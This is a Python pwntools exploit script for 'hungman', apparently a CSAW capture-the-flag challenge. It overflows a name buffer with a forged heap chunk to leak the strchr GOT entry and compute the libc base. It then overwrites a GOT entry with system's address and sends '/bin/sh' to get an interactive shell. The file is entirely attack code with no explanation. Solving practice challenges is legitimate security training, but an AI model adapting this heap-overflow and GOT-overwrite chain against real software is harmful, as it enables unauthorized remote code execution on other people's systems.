#!/usr/bin/env python2

from pwn import *
import sys
import time

is_remote = len(sys.argv) > 1
if is_remote:
    p = remote('pwn.chal.csaw.io', 8003)
    libc_base = None
    free_sss = 0
    free_offset = 0x00083a70
    system_offset = 0x45380
    memset_offset = 0x0008e780
    strchr_offset = 0x00089050+ 0x30
else:
    p = process('./hungman')
    #  gdb.attach(p, '''
        #  break *0x0000000000400EC4
        #  continue
    #  ''')
    free_sss = 0
    memset_offset = 0x0008c4b0
    free_offset = 0x00082d00
    system_offset = 0x00046590
    strchr_offset = 0x00086d10 + 0x30
    libc_base = 0x00007ffff7c29000

p.recvuntil('your name?\n')
p.sendline('A'*30)
time.sleep(0.7)
print p.recvline()

for i in string.ascii_lowercase:
    t = p.recvline()
    print t
    if 'change name?' in t:
        break

    p.sendline(i)
    time.sleep(0.7)

free_addr = 0x0000000000602018
memset_got = 0x0000000000602050
strchr_got = 0x00602038
p.sendline('y')
time.sleep(0.7)
p.sendline('B'*32 + p64(0) + p64(0x91) + p32(0x52) + p32(0xc9) + p64(strchr_got))
time.sleep(0.7)
t = p.recvuntil('Continue? ')
t = t[t.index(':')+2:]
t = t[:t.index('score')-1]
t = '\x00' * free_sss + t
t = t.ljust(8, '\x00')
strchr_addr = u64(t)
print 'strchr = %#x' % (strchr_addr,)
libc_base = strchr_addr - strchr_offset

system_addr = libc_base + system_offset
free_addr = libc_base + free_offset
memset_addr = libc_base + memset_offset
print '[+] libc @ %#x' % (libc_base,)
print '[+] free @ %#x' % (free_addr,)
print '[+] memset @ %#x' % (memset_addr,)
print '[+] system @ %#x' % (system_addr,)

p.sendline('y')
time.sleep(0.7)

for i in string.ascii_lowercase:
    t = p.recvline()
    print t
    if 'change name?' in t:
        break

    p.sendline(i)
    time.sleep(0.7)

p.sendline('y')
time.sleep(0.7)
p.send(p64(system_addr))
time.sleep(0.7)
p.recvuntil('Continue? ')
p.sendline('y')
time.sleep(0.7)

for i in string.ascii_lowercase:
    t = p.recvline()
    print t
    if 'change name?' in t:
        break

    p.sendline(i)
    time.sleep(0.7)

p.send('y')
time.sleep(0.7)
p.sendline('/bin/sh')
time.sleep(0.7)

p.interactive()
